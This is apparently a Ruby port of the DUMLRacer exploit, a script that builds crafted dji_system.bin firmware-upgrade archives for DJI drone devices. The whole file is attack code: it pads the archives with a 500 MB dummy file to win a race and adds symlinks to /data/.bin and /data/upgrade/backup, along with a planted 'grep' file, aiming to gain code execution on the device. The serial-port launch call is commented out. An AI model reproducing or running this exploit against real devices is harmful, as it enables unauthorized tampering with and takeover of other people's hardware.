# https://github.com/CunningLogic/DUMLRacer 
#
# PayPal Donations - > jcase@cunninglogic.com 
# Bitcoin Donations - > 1LrunXwPpknbgVYcBJyDk6eanxTBYnyRKN 
# Bitcoin Cash Donations - > 1LrunXwPpknbgVYcBJyDk6eanxTBYnyRKN 
# Amazon giftcards, plain thank yous or anything else -> jcase@cunninglogic.com
# 
# DUMLRacer implemented in Ruby - hostile@Me.com
# 

require 'zlib'
$:.unshift File.expand_path('..',__dir__)
require "RubaDubDUML.rb"
require 'tempfile'

class TempIO < Tempfile
	def initialize(string = '')
		super "TempIO"
		binmode
		write string
		rewind
	end

	def string
		flush
		Gem.read_binary path
	end
end

exploit = PwnSauce.new

# Stage 1 builder
io = TempIO.new
tar_writer = Gem::Package::TarWriter.new @io

require 'rubygems/package'

# Create a large dummy file
size = 500
File.open("dummy", 'w') do |f|
	contents = "\x00" * (1024*1024)
	size.to_i.times { f.write(contents) }
end

File.open("dji_system.bin", "wb") do |file|
	Zlib::GzipWriter.wrap(file) do |gz|
		Gem::Package::TarWriter.new(gz) do |tar|
			get_wrekt = "Burning 0day!!\n"
			tar.add_file_simple("HappyNewYear", 0666, get_wrekt.length) do |io|
				io.write(get_wrekt)
			end
			
			size = File.stat("dummy").size
			tar.add_file_simple "dummy", 0755, size do |io|
				File.open "dummy", "r" do |infile|
					io.write infile.read
				end
			end

			tar.add_symlink("jcase", "/data/.bin", 0755)
			tar.add_symlink("freedom", "/data/upgrade/backup", 0755)

      			puts "Jamaica, we have a bobsled team!"
		end
	end
end

FileUtils.mkdir("freedom")
FileUtils.mkdir("jcase")
File.open("freedom/wm220.cfg.sig", 'w') do |f|
	f.write("")
end
File.open("jcase/grep", 'w') do |f|
	f.write("echo hi")
end

# Execute Stage 1
#exploit.pwn("/dev/tty.usbmodem1445", "dji_system.bin", "")

# Stage 2 builder

File.unlink("dji_system.bin")
File.open("dji_system.bin", "wb") do |file|
        Zlib::GzipWriter.wrap(file) do |gz|
                Gem::Package::TarWriter.new(gz) do |tar|
                        size = File.stat("dummy").size
                        tar.add_file_simple "dummy", 0755, size do |io|
                                File.open "dummy", "r" do |infile|
                                        io.write infile.read
                                end
                        end

			tar.mkdir("freedom",0755)
			tar.mkdir("jcase",0755)

#                        size = File.stat("freedom/wm220.cfg.sig").size
#                        tar.add_file_simple "freedom/wm220.cfg.sig", 0755, size do |io|
#                                File.open "freedom/wm220.cfg.sig", "r" do |infile|
#                                        io.write infile.read
#                                end
#                        end

#                        size = File.stat("jcase/grep").size
#                        tar.add_file_simple "jcase/grep", 0755, size do |io|
#                                File.open "jcase/grep", "r" do |infile|
#                                        io.write infile.read
#                                end
#                        end

                        hello = "hello\n"
                        tar.add_file_simple("wellhello", 0666, hello.length) do |io|
                                io.write(hello)
                        end

                        tar.add_file_simple "dummy", 0755, size do |io|
                                File.open "dummy", "r" do |infile|
                                        io.write infile.read
                                end
                        end

                        puts "Feel the Rhythm! Feel the Rhyme! Get on up, it's bobsled time! Cool Runnings!"
                end
        end
end

# Execute Stage 1 intervention and Begin Stage 2
